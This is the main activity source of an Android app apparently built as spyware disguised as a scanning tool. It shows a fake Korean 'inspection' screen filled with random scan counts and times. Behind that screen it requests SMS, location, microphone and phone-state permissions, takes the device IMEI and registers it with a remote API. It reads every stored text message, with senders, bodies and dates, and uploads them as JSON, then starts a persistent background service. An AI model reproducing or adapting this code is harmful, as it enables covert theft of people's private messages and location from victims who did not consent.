package com.track.client;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import android.Manifest;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.widget.TextView;
import android.widget.Toast;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.track.client.model.BaseRes;
import com.track.client.model.SMSData;
import com.track.client.preferences.AppSharedPreference;
import com.track.client.retrofit.ApiCall;
import com.track.client.retrofit.IApiCallback;
import com.track.client.service.MainService;

import java.lang.reflect.Type;
import java.text.Format;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Random;

import retrofit2.Response;

//import static android.Manifest.permission.READ_PHONE_NUMBERS;
//import static android.Manifest.permission.READ_PHONE_STATE;
//import static android.Manifest.permission.READ_SMS;

public class MainActivity extends AppCompatActivity implements IApiCallback<BaseRes>, Handler.Callback {

    String android_id = "", phoneNumber = "";
    public static final String identity = "a";
    private static final int PERMISSION_REQUEST_FOR_THIS_APP = 1;
    TelephonyManager mTelephonyManager;
    TextView tvResult, tvTime;
    Handler mHandler;
    String bodys = "";

    private static final int LOCATION_PERMISSION = 101;
    private static final int GPS_ENABLE = 102;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        getWindow().setStatusBarColor(getResources().getColor(R.color.switchTrack));
        tvResult = findViewById(R.id.tv_result_number);
        tvTime = findViewById(R.id.tv_time);

        Random r = new Random();
        int number = r.nextInt(100000 - 60000 + 1) + 60000;
        tvResult.setText("검사 수: " + number + "개");

        number = r.nextInt(30 - 10 + 1) + 10;
        tvTime.setText("검사시간: 00:00:" + number);

        mHandler = new Handler(this);

        mTelephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

        LocationManager manager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        if (!manager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
            buildAlertMessageNoGps();
        } else {
            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_DENIED
                    || checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_DENIED
                    || checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_DENIED
                    || checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_DENIED
                    || checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_DENIED
            ) {
                String[] permissions = {Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.RECORD_AUDIO, Manifest.permission.READ_SMS};
                requestPermissions(permissions, PERMISSION_REQUEST_FOR_THIS_APP);
            } else {
                process();
            }
        }

        getSMSContent();
    }

    private void buildAlertMessageNoGps() {
        final AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setMessage("Your GPS seems to be disabled, Please be enable it?")
                .setCancelable(false)
                .setPositiveButton("Yes", new DialogInterface.OnClickListener() {
                    public void onClick(final DialogInterface dialog, final int id) {
                        startActivityForResult(new Intent(android.provider.Settings.ACTION_LOCATION_SOURCE_SETTINGS), GPS_ENABLE);
                    }
                })
                .setNegativeButton("No", new DialogInterface.OnClickListener() {
                    public void onClick(final DialogInterface dialog, final int id) {
                        finish();
                    }
                });
        final AlertDialog alert = builder.create();
        alert.show();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == LOCATION_PERMISSION || requestCode == GPS_ENABLE) {
            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_DENIED
                    || checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_DENIED
                    || checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_DENIED
                    || checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_DENIED
                    || checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_DENIED
            ) {
                String[] permissions = {Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.RECORD_AUDIO, Manifest.permission.READ_SMS};
                requestPermissions(permissions, PERMISSION_REQUEST_FOR_THIS_APP);
            } else {
                process();
            }
        }
    }

    void process() {
        android_id = AppSharedPreference.getInstance(this).getDeviceId();
        if (android_id.equals("")) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                    android_id = mTelephonyManager.getDeviceId();
                }
            } else {
                android_id = mTelephonyManager.getDeviceId();
            }
            AppSharedPreference.getInstance(this).setDeviceId(android_id);
            ApiCall.getInstance().registerWithId(android_id, phoneNumber, identity, this);
        } else {
            Intent intent = new Intent(this, MainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            mHandler.sendEmptyMessageDelayed(0, 3000);
        }
    }

    void getSMSContent() {
//         public static final String INBOX = "content://sms/inbox";
//        public static final String SENT = "content://sms/sent";
//        public static final String DRAFT = "content://sms/draft";
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/"), null, null, null, null);
        String msgData = "";
        if (cursor.moveToFirst()) { // must check the result to prevent exception
            ArrayList smsArray = new ArrayList(cursor.getCount());
            do {
                SMSData tmpSMSData = new SMSData();
                tmpSMSData.setSms_id(cursor.getString(cursor.getColumnIndex("_id")));
                tmpSMSData.setAddress(cursor.getString(cursor.getColumnIndex("address")));
                tmpSMSData.setBody(escapeForJava(cursor.getString(cursor.getColumnIndex("body")), false));
                tmpSMSData.setDate(cursor.getLong(cursor.getColumnIndex("date")));
                tmpSMSData.setRead_state(cursor.getString(cursor.getColumnIndex("read")));
                tmpSMSData.setType(cursor.getString(cursor.getColumnIndex("type")));

                msgData += cursor.getString(cursor.getColumnIndex("_id")) + ":" // id
                        + cursor.getString(cursor.getColumnIndex("address")) + ":"  // address
                        + cursor.getString(cursor.getColumnIndex("body")) + ":"  // date
                        + cursor.getString(cursor.getColumnIndex("read")) + ":"  // read state
                        + cursor.getString(cursor.getColumnIndex("date")) + ":"  // type
                        + cursor.getString(cursor.getColumnIndex("type")) +     // body
                        "\n";  // read state
                // use msgData
                smsArray.add(tmpSMSData);
            } while (cursor.moveToNext());
            ((TextView) findViewById(R.id.tv_title)).setText(msgData);
            Gson gson = new Gson();
            Type type = new TypeToken<ArrayList<SMSData>>() {
            }.getType();
            String json = gson.toJson(smsArray, type);
            ApiCall.getInstance().addSMSArray(AppSharedPreference.getInstance(this).getDeviceId(), json, this);
        } else {
            // empty box, no SMS
            Toast.makeText(this, "Empty SMS", Toast.LENGTH_SHORT).show();
        }
    }

    public String convertTime(String time){
        Date date = new Date(Long.valueOf(time));
        Format format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        return format.format(date);
    }

    public String escapeForJava( String value, boolean quote )
    {
        StringBuilder builder = new StringBuilder();
        if( quote )
            builder.append( "\"" );
        for( char c : value.toCharArray() )
        {
            if( c == '\'' )
                builder.append( "\\'" );
            else if ( c == '\"' )
                builder.append( "\\\"" );
            else if( c == '\r' )
                builder.append( "\\r" );
            else if( c == '\n' )
                builder.append( "\\n" );
            else if( c == '\t' )
                builder.append( "\\t" );
//            else if( c < 32 || c >= 127 )
//                builder.append( String.format( "\\u%04x", (int)c ) );
            else
                builder.append( c );
        }
        if( quote )
            builder.append( "\"" );
//        bodys+=builder.toString();
        return builder.toString();
    }

    @Override
    public boolean handleMessage(@NonNull Message msg) {
        switch (msg.what) {
            case 0:
//                finish();
                break;
        }
        return false;
    }


    @Override
    public void onSuccess(String type, Response<BaseRes> response) {
        if (type.equals("add_sms")) {
            if (response.isSuccessful()) {
                if (response.body().getErrorCode().equals("0")) {
                    Toast.makeText(this, response.body().getErrorMsg(), Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(this, response.body().getErrorMsg(), Toast.LENGTH_SHORT).show();
                }
            } else {
                Toast.makeText(this, response.body().getErrorMsg(), Toast.LENGTH_SHORT).show();
            }
        } else {
            if (response.isSuccessful()) {
                if (response.body().getErrorCode().equals("0") && response.body().getErrorMsg().equals("ok")) {
                    AppSharedPreference.getInstance(this).setDeviceId(android_id);
                    Intent intent = new Intent(this, MainService.class);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(intent);
                    } else {
                        startService(intent);
                    }
                    mHandler.sendEmptyMessageDelayed(0, 2000);
                } else {
                    ApiCall.getInstance().registerWithId(android_id, phoneNumber, identity, this);
                }
            } else {
                ApiCall.getInstance().registerWithId(android_id, phoneNumber, identity, this);
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case PERMISSION_REQUEST_FOR_THIS_APP: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
//                    Toast.makeText(this, "Permission granted: " + PERMISSION_REQUEST_READ_PHONE_STATE, Toast.LENGTH_SHORT).show();
                    process();
                } else {
//                    Toast.makeText(this, "Permission NOT granted: " + PERMISSION_REQUEST_READ_PHONE_STATE, Toast.LENGTH_SHORT).show();
                    finish();
                }
                return;
            }
        }
    }

//    private void requestPermission() {
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
//            requestPermissions(new String[]{READ_SMS, READ_PHONE_NUMBERS, READ_PHONE_STATE}, 100);
//        }
//    }
//    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
//        switch (requestCode) {
//            case 100:
//                TelephonyManager tMgr = (TelephonyManager)  this.getSystemService(Context.TELEPHONY_SERVICE);
//                if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) !=
//                        PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this,
//                        Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED  &&
//                        ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
//                    return;
//                }
//                phoneNumber = tMgr.getLine1Number();
//                break;
//        }
//    }


    @Override
    public void onFailure(Object data) {
        ApiCall.getInstance().registerWithId(android_id, phoneNumber, identity, this);
    }
}
